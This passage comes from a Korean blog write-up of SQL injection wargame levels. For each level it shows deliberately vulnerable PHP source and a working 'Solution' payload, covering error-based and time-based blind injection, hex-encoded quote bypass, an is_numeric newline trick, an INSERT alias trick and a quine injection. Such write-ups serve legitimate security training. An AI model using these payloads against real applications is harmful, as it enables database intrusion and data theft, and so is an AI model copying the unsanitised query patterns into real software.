border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$rows</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">while</span>((<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_evil_wizard where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;evil_wizard&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일하게 오류를 발생시키는 연산식으로 Blind injection을 수행할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : order=if(email like &quot;%&quot;,3e300*3e300,1)</span><br></pre></td></tr></table></figure><h3 id="25-green-dragon"><a href="#25-green-dragon" class="headerlink" title="25. green_dragon"></a>25. green_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,pw from prob_green_dragon where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">    <span class="variable">$query2</span> = <span class="string">&quot;select id from prob_green_dragon where id=&#x27;<span class="subst">&#123;$result[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$result[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query2 : &lt;strong&gt;<span class="subst">&#123;$query2&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query2</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;green_dragon&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼리의 결과값을 사용해 또 다른 쿼리를 실행하는 이중 쿼리 문제입니다.<br>입력값과 결과값 모두에서 쿼트를 필터링 하는데, hex 인코딩을 사용하면 우회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=\&amp;pw=union select 0x5c,0x756e696f6e2073656c6563742030783631363436643639366523#</span><br></pre></td></tr></table></figure><h3 id="26-red-dragon"><a href="#26-red-dragon" class="headerlink" title="26. red_dragon"></a>26. red_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\./i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &gt; <span class="number">7</span>) <span class="keyword">exit</span>(<span class="string">&quot;too long string&quot;</span>);</span><br><span class="line">  <span class="variable">$no</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_red_dragon where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and no=<span class="subst">&#123;$no&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select no from prob_red_dragon where id=&#x27;admin&#x27;&quot;</span>; <span class="comment">// if you think challenge got wrong, look column name again.</span></span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;no&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;red_dragon&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>본 문항은 본래 비교연산자와 no 부분에 16진수 인코딩된 문자열을 삽입하여 pw 컬럼을 알아내는 문제였는데 php 버전을 업데이트 하면서 is_numeric 함수가 hex값에 대해 false를 반환하도록 변경되어 no값을 알아내는 문제로 변경되었습니다.</p><p>php의 is_numeric 함수는 숫자의 앞 부분에 %09, %20, %0a, %0b, %0c, %0d 가 오는 것을 허용합니다. 따라서 id 파라미터에 끝에 #을 삽입하여 뒷 부분을 주석처리해 주고 no 파라미터의 앞 부분에 개행문자를 삽입해 주면 비교식을 통해 no값을 알아낼 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&#x27;||no&gt;#&amp;no=%0a1000000</span><br></pre></td></tr></table></figure><h3 id="27-blue-dragon"><a href="#27-blue-dragon" class="headerlink" title="27. blue_dragon"></a>27. blue_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\./i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\./i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_blue_dragon where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\\\/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\\\/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_blue_dragon where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;blue_dragon&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼리 수행을 먼저 한 후에 필터링을 하는 조금 특이한 구성을 하고 있습니다. 결과값도 확인이 불가능하지만, Time based를 사용하면 필터링에 구애받지 않고 pw를 알아낼 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&amp;pw=&#x27;||id=&quot;admin&quot; and if(pw like &#x27;%&#x27;,sleep(1),0)#</span><br></pre></td></tr></table></figure><h3 id="28-frankenstein"><a href="#28-frankenstein" class="headerlink" title="28. frankenstein"></a>28. frankenstein</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(|\)|union/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,pw from prob_frankenstein where id=&#x27;frankenstein&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$db</span>)) <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_frankenstein where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;frankenstein&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Error based 문제인데 괄호가 필터링 되어 있습니다.<br>하지만 case when .. then .. else .. end 구문을 이용하면 괄호없이 Blind injection이 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||id=&#x27;admin&#x27; and case when pw like &#x27;%&#x27; then 3e300*3e300 else 1 end#</span><br></pre></td></tr></table></figure><h3 id="29-phantom"><a href="#29-phantom" class="headerlink" title="29. phantom"></a>29. phantom</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(<span class="string">&quot;phantom&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;joinmail&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;insert into prob_phantom values(0,&#x27;<span class="subst">&#123;$_SERVER[REMOTE_ADDR]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_GET[joinmail]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$rows</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;select no,ip,email from prob_phantom where no=1 or ip=&#x27;<span class="subst">&#123;$_SERVER[REMOTE_ADDR]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;no&#x27;</span>] == <span class="number">1</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[ip]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_phantom where no=1 and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>]))&#123; <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;delete from prob_phantom where no != 1&quot;</span>); <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;alter table prob_phantom AUTO_INCREMENT=2&quot;</span>); <span class="title function_ invoke__">solve</span>(<span class="string">&quot;phantom&quot;</span>); &#125;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>insert 문에서는 대상 테이블과 동일한 테이블에서 데이터를 참조하는 것이 금지되어 있는데 as 문을 이용해 테이블에 별칭을 정의해주면 우회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : joinmail=&#x27;),(0,&quot;&lt;my ip&gt;&quot;,(select email from prob_phantom as a limit 1))#</span><br></pre></td></tr></table></figure><h3 id="30-ouroboros"><a href="#30-ouroboros" class="headerlink" title="30. ouroboros"></a>30. ouroboros</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|rollup|join|@/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_ouroboros where pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Pw : <span class="subst">&#123;$result[pw]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;ouroboros&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Quine SQL Injection</p><p><a target="_blank" rel="noopener" href="https://p.osix.kr/quine-sql-injection/">https://p.osix.kr/quine-sql-injection/</a></p></blockquote><p>이전에 작성한 게시글로 설명을 대체하겠습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27; union select replace(replace(&#x27;&quot; union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;) #&#x27;,char(34),char(39)),char(36),&#x27;&quot; union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;) #&#x27;) #</span><br></pre></td></tr></table></figure><h3 id="31-zombie"><a href="#31-zombie" class="headerlink" title="31. zombie"></a>31. zombie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(<span class="string">&quot;zombie&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rollup|join|ace|@/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_zombie where pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Pw : <span 